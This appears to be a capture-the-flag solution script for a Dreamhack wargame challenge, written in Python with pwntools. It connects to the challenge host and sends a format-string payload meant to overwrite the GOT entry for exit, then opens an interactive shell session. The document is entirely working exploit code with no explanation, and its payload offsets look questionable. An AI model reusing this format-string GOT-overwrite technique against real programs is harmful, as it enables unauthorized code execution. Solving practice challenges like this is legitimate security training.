from pwn import *

p = remote("host1.dreamhack.games", 21171)
elf = ELF("./basic_exploitation_002")
exit = elf.got['exit']
print(exit)

pay = "%2044c%1$hn%32261c%0$hn"
pay += p32(exit)
pay += p32(exit+2)

p.sendline(pay)
p.interactive()